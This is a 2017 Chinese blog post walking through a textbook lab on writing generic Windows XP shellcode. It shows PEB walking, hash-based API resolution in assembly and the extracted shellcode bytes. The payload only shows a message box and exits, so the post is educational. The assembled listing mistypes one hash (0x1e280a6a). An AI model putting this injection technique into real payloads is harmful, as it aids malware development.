<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>General shellcode | qwertwwwe</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="windows xp上的通用shellcode0day书上3.4节的通用shellcode开发实验：
开发环境windows xp sp3visual C++ 6.0
shellcode适用环境windows xp sp3及之前版本，windows 7稍微改动亦可
1.获取3个函数名hash后的值通过将字符串进行hash计算，得到一个更短的字符串，从而简化shellcode中字符串对比的代码。ha">
<meta property="og:type" content="article">
<meta property="og:title" content="General shellcode">
<meta property="og:url" content="http://qwertwwwe.github.io/2017/01/18/general-shellcode/index.html">
<meta property="og:site_name" content="qwertwwwe">
<meta property="og:description" content="windows xp上的通用shellcode0day书上3.4节的通用shellcode开发实验：
开发环境windows xp sp3visual C++ 6.0
shellcode适用环境windows xp sp3及之前版本，windows 7稍微改动亦可
1.获取3个函数名hash后的值通过将字符串进行hash计算，得到一个更短的字符串，从而简化shellcode中字符串对比的代码。ha">
<meta property="og:image" content="http://qwertwwwe.github.io/images/general-shellcode/shellcode_stack1.png">
<meta property="og:image" content="http://qwertwwwe.github.io/images/general-shellcode/kernel32.png">
<meta property="og:image" content="http://qwertwwwe.github.io/images/general-shellcode/kernel32_arch.png">
<meta property="og:image" content="http://qwertwwwe.github.io/images/general-shellcode/ollydbg.png">
<meta property="og:updated_time" content="2017-01-25T03:08:33.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="General shellcode">
<meta name="twitter:description" content="windows xp上的通用shellcode0day书上3.4节的通用shellcode开发实验：
开发环境windows xp sp3visual C++ 6.0
shellcode适用环境windows xp sp3及之前版本，windows 7稍微改动亦可
1.获取3个函数名hash后的值通过将字符串进行hash计算，得到一个更短的字符串，从而简化shellcode中字符串对比的代码。ha">
<meta name="twitter:image" content="http://qwertwwwe.github.io/images/general-shellcode/shellcode_stack1.png">
  
    <link rel="alternate" href="/atom.xml" title="qwertwwwe" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">qwertwwwe</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" results="0" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://qwertwwwe.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-general-shellcode" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2017/01/18/general-shellcode/" class="article-date">
  <time datetime="2017-01-18T12:01:52.000Z" itemprop="datePublished">2017-01-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      General shellcode
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="windows-xp上的通用shellcode"><a href="#windows-xp上的通用shellcode" class="headerlink" title="windows xp上的通用shellcode"></a>windows xp上的通用shellcode</h1><p>0day书上3.4节的通用shellcode开发实验：</p>
<h2 id="开发环境"><a href="#开发环境" class="headerlink" title="开发环境"></a>开发环境</h2><p>windows xp sp3<br>visual C++ 6.0</p>
<h2 id="shellcode适用环境"><a href="#shellcode适用环境" class="headerlink" title="shellcode适用环境"></a>shellcode适用环境</h2><p>windows xp sp3及之前版本，windows 7稍微改动亦可</p>
<h3 id="1-获取3个函数名hash后的值"><a href="#1-获取3个函数名hash后的值" class="headerlink" title="1.获取3个函数名hash后的值"></a>1.获取3个函数名hash后的值</h3><p>通过将字符串进行hash计算，得到一个更短的字符串，从而简化shellcode中字符串对比的代码。<br>hash函数的C代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function">DWORD <span class="title">GetHash</span><span class="params">(<span class="keyword">char</span> *fun_name)</span></span></div><div class="line">&#123;</div><div class="line">    DWORD digest = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span>(*fun_name)</div><div class="line">    &#123;</div><div class="line">        digest = ((digest &lt;&lt; <span class="number">25</span>) | (digest &gt;&gt; <span class="number">7</span>));</div><div class="line">        digest += *fun_name;</div><div class="line">        fun_name++;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> digest;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">f_hash_print</span><span class="params">(<span class="keyword">char</span> *str)</span></span></div><div class="line">&#123;</div><div class="line">    DWORD hash = GetHash(str);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s hash is : 0x%.8x\n"</span>, str, hash);</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    f_hash_print(<span class="string">"MessageBoxA"</span>);</div><div class="line">    f_hash_print(<span class="string">"ExitProcess"</span>);</div><div class="line">    f_hash_print(<span class="string">"LoadLibraryA"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>得到hash值为：<br>MessageBoxA : 0x1e380a6a<br>ExitProcess : 0x4fd18963<br>LoadLibraryA : 0x0c917432 </p>
<h3 id="2-编写shellcode"><a href="#2-编写shellcode" class="headerlink" title="2.编写shellcode"></a>2.编写shellcode</h3><p>首先将3个函数的hash值压入栈 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">CLD                 ;clear flag DF</div><div class="line">;store hash</div><div class="line">push 0x1e380a6a     ;hash of MessageBoxA</div><div class="line">push 0x4fd18963     ;hash of ExitProcess</div><div class="line">push 0x0c917432     ;hash of LoadLibraryA</div><div class="line">mov esi, esp        ;esi = addr of first function hash[LoadLibraryA]</div><div class="line">lea edi, [esi - 0xc]</div></pre></td></tr></table></figure>
<p>然后抬高栈，保护shellcode不被入栈数据破坏</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">;make some stack space</div><div class="line">xor ebx, ebx</div><div class="line">mov bh, 0x04</div><div class="line">sub esp, ebx</div></pre></td></tr></table></figure>
<p>将“use32“字符串压入栈，后面LoadLibraryA调用时需要该参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">;push a pointer to &quot;user32&quot; onto stack</div><div class="line">mov bx, 0x3233</div><div class="line">push ebx</div><div class="line">push 0x72657375</div><div class="line">push esp</div><div class="line">xor edx, edx</div></pre></td></tr></table></figure>
<p>此时栈中的状态如图所示：<br><img src="images/general-shellcode/shellcode_stack1.png" alt="stack status"> </p>
<p>找到kernel32.dll的基址</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">;find base addr of kernel32.dll</div><div class="line">mov ebx, fs:[edx + 0x30]    ;ebx = addr of PEB</div><div class="line">mov ecx, [ebx + 0x0c]       ;ecx = pointer to loader data</div><div class="line">mov ecx, [ecx + 0x1c]       ;ecx = first entry in initialization order list</div><div class="line">mov ecx, [ecx]              ;(kernel32.dll)</div><div class="line">mov ebp, [ecx + 0x08]       ;ebp = base addr of kernel32.dll</div></pre></td></tr></table></figure>
<p>开始查找3个函数的地址 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">find_lib_functions:</div><div class="line">    lodsd               ;eax = DS * 10H + ESI, esi++</div><div class="line">    cmp eax, 0x1e380a6a	 ;hash of &quot;MessageBoxA&quot;</div><div class="line">    jne find_functions</div><div class="line">    xchg eax, ebp       ;save eax to ebp</div><div class="line">    call [edi - 0x8]    ;call LoadLibraryA</div><div class="line">    xchg eax, ebp       ;restore current to eax, and update ebp</div><div class="line">                        ;with base address of uer32.dll</div><div class="line"></div><div class="line">find_functions:</div><div class="line">    pushad              ;存储寄存器值，依次压入EAX,ECX,EDX,ECX,</div><div class="line">                        ;EDX,EBX,ESP,EBP,ESI,EDI</div><div class="line">                        </div><div class="line">    mov eax, [ebp + 0x3c]           ;eax = start of PE header</div><div class="line">    mov ecx, [ebp + eax + 0x78]     ;ecx = relative offset of export table</div><div class="line">    add ecx, ebp                    ;ecx = absolute addr of export table</div><div class="line">    mov ebx, [ecx + 0x20]           ;ebx = relative offset of names table</div><div class="line">    add ebx, ebp                    ;ebx = absolute addr of names tables</div><div class="line">    xor edi, edi</div><div class="line"></div><div class="line">next_function_loop:</div><div class="line">    inc edi                         ;i = 0</div><div class="line">    mov esi, [ebx + edi * 4]        ;esi = relative offset of current function name</div><div class="line">    add esi, ebp                    ;esi = absolute addr of current function name</div><div class="line">    cdq                             ;edx:eax</div><div class="line">	</div><div class="line">hash_loop:</div><div class="line">    movsx eax, byte ptr[esi]</div><div class="line">    cmp al, ah</div><div class="line">    jz compare_hash</div><div class="line">    ror edx, 7</div><div class="line">    add edx, eax</div><div class="line">    inc esi</div><div class="line">    jmp hash_loop</div><div class="line">	</div><div class="line">compare_hash:</div><div class="line">    cmp edx, [esp + 0x1c]           ;cmp to the requested hash</div><div class="line">    jnz next_function_loop</div><div class="line">    mov ebx, [ecx + 0x24]           ;ebx = absolute addr of ordinals</div><div class="line">    ;table</div><div class="line">    add ebx, ebp						</div><div class="line">    mov di, [ebx + 2 * edi]</div><div class="line">    mov ebx, [ecx + 0x1c]</div><div class="line">    add ebx, ebp</div><div class="line">    add ebp, [ebx + 4 * edi]</div><div class="line">    xchg eax, ebp</div><div class="line">    pop edi</div><div class="line">    stosd</div><div class="line">	</div><div class="line">    push edi</div><div class="line">    popad</div><div class="line">    cmp eax, 0x1e380a6a</div><div class="line">    jne find_lib_functions</div><div class="line">	</div><div class="line">function_call:</div><div class="line">    xor ebx, ebx</div><div class="line">    push ebx                        ;cut string</div><div class="line">    push 0x74736577				</div><div class="line">    push 0x6c696166                 ;push &quot;failwest&quot;</div><div class="line">    mov eax, esp</div><div class="line">    push ebx</div><div class="line">    push eax</div><div class="line">    push eax</div><div class="line">    push ebx</div><div class="line">    call [edi - 0x04]               ;call MessageBoxA</div><div class="line">    push ebx</div><div class="line">    call [edi - 0x08]               ;call ExitProcess</div><div class="line">    nop</div><div class="line">    nop</div><div class="line">    nop</div><div class="line">    nop</div></pre></td></tr></table></figure>
<h4 id="这3个函数的查找方法："><a href="#这3个函数的查找方法：" class="headerlink" title="这3个函数的查找方法："></a>这3个函数的查找方法：</h4><ol>
<li><p>查找kernel32.dll地址，以及从kernel32.dll中查找LoadLibraryA函数过程：<br> <img src="images/general-shellcode/kernel32.png" alt="kernel32"><br> <img src="images/general-shellcode/kernel32_arch.png" alt=""></p>
</li>
<li><p>函数查找顺序<br> [1]. LoadLibraryA -&gt; ExitProcess -&gt; MessageBox<br> [2]. 找到的各函数地址，依次存储在前面栈图中的edi所指向的空间；<br> [3]. 每次查找时，将ebp指向相应函数所在的dll地址；<br> [4]. 最后找MessageBox，在找MessageBox之前，调用LoadLibraryA函数，加载user32，并将ebp指向user32首地址；</p>
</li>
</ol>
<h3 id="3-整体代码如下"><a href="#3-整体代码如下" class="headerlink" title="3. 整体代码如下"></a>3. 整体代码如下</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    __asm&#123;</div><div class="line">        cld</div><div class="line">        push <span class="number">0x1e380a6a</span>	        <span class="comment">//hash of MessageBox</span></div><div class="line">        push <span class="number">0x4fd18963</span>	        <span class="comment">//hash of ExitProcess</span></div><div class="line">        push <span class="number">0x0c917432</span>	        <span class="comment">//hash of LoadLibraryA</span></div><div class="line">        mov esi, esp            <span class="comment">//esi = addr of "LoadLibraryA"</span></div><div class="line">        lea edi, [esi - <span class="number">0xc</span>]    <span class="comment">//edi = addr to start writing function	</span></div><div class="line"></div><div class="line">        ;make some <span class="built_in">stack</span> space</div><div class="line">        xor ebx, ebx</div><div class="line">        mov bh, <span class="number">0x04</span></div><div class="line">        sub esp, ebx</div><div class="line"></div><div class="line">        ;push a pointer to <span class="string">"user32"</span> onto <span class="built_in">stack</span></div><div class="line">        mov bx, <span class="number">0x3233</span></div><div class="line">        push ebx</div><div class="line">        push <span class="number">0x72657375</span></div><div class="line">        push esp</div><div class="line">        xor edx, edx</div><div class="line"></div><div class="line">        ;find base addr of kernel32.dll</div><div class="line">        mov ebx, fs:[edx + <span class="number">0x30</span>]</div><div class="line">        mov ecx, [ebx + <span class="number">0x0c</span>]</div><div class="line">        mov ecx, [ecx + <span class="number">0x1c</span>]</div><div class="line">        mov ecx, [ecx]</div><div class="line">        mov ebp, [ecx + <span class="number">0x08</span>]</div><div class="line"></div><div class="line">    find_lib_functions:</div><div class="line">        lodsd</div><div class="line">        cmp eax, <span class="number">0x1e380a6a</span></div><div class="line">        jne find_functions</div><div class="line">        xchg eax, ebp</div><div class="line">        call [edi - <span class="number">0x8</span>]</div><div class="line">        xchg eax, ebp</div><div class="line"></div><div class="line">    find_functions:</div><div class="line">        pushad</div><div class="line">        mov eax, [ebp + <span class="number">0x3c</span>]</div><div class="line">        mov ecx, [ebp + eax + <span class="number">0x78</span>]</div><div class="line">        add ecx, ebp</div><div class="line">        mov ebx, [ecx + <span class="number">0x20</span>]</div><div class="line">        add ebx, ebp</div><div class="line">        xor edi, edi</div><div class="line"></div><div class="line">    next_function_loop:</div><div class="line">        inc edi</div><div class="line">        mov esi, [ebx + edi * <span class="number">4</span>]</div><div class="line">        add esi, ebp</div><div class="line">        cdq</div><div class="line"></div><div class="line">    hash_loop:</div><div class="line">        movsx eax, byte ptr[esi]</div><div class="line">        cmp al, ah</div><div class="line">        jz compare_hash</div><div class="line">        ror edx, <span class="number">7</span></div><div class="line">        add edx, eax</div><div class="line">        inc esi</div><div class="line">        jmp hash_loop</div><div class="line"></div><div class="line">    compare_hash:</div><div class="line">        cmp edx, [esp + <span class="number">0x1c</span>]</div><div class="line">        jnz next_function_loop</div><div class="line">        mov ebx, [ecx + <span class="number">0x24</span>]</div><div class="line">        ;table</div><div class="line">        add ebx, ebp</div><div class="line">        mov di, [ebx + <span class="number">2</span> * edi]</div><div class="line">        mov ebx, [ecx + <span class="number">0x1c</span>]</div><div class="line"></div><div class="line">        add ebx, ebp</div><div class="line">        add ebp, [ebx + <span class="number">4</span> * edi]</div><div class="line"></div><div class="line">        xchg eax, ebp</div><div class="line">        pop edi</div><div class="line">        stosd</div><div class="line">        push edi</div><div class="line">        popad</div><div class="line">        cmp eax, <span class="number">0x1e280a6a</span></div><div class="line">        jne find_lib_functions</div><div class="line"></div><div class="line">    function_call:</div><div class="line">        xor ebx, ebx</div><div class="line">        push ebx</div><div class="line">        push <span class="number">0x74736577</span></div><div class="line">        push <span class="number">0x6c696166</span></div><div class="line">        mov eax, esp</div><div class="line">        push ebx</div><div class="line">        push eax</div><div class="line">        push eax</div><div class="line">        push ebx</div><div class="line">        call [edi - <span class="number">0x04</span>]</div><div class="line">        push ebx</div><div class="line">        call [edi - <span class="number">0x08</span>]</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>编译查看exe文件，提取shellcode<br><img src="images/general-shellcode/ollydbg.png" alt=""> </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</div><div class="line">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</div><div class="line">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</div><div class="line">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</div><div class="line">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</div><div class="line">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</div><div class="line">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</div><div class="line">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</div><div class="line">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</div><div class="line">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</div><div class="line">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</div></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://qwertwwwe.github.io/2017/01/18/general-shellcode/" data-id="cj3n87wvp0001btnhddtbz0k4" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2017/04/22/hello-world/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Hello World
        
      </div>
    </a>
  
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/04/">April 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">January 2017</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2017/06/07/windows-read-registers/">windows read registers</a>
          </li>
        
          <li>
            <a href="/2017/04/22/PoDoFo-0-9-5-allows-remote-attackers-to-cause-a-denial-of-service-infinit-loop/">PoDoFo 0.9.5 allows remote attackers to cause a denial of service(infinite loop)</a>
          </li>
        
          <li>
            <a href="/2017/04/22/hello-world/">Hello World</a>
          </li>
        
          <li>
            <a href="/2017/01/18/general-shellcode/">General shellcode</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2017 rg<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>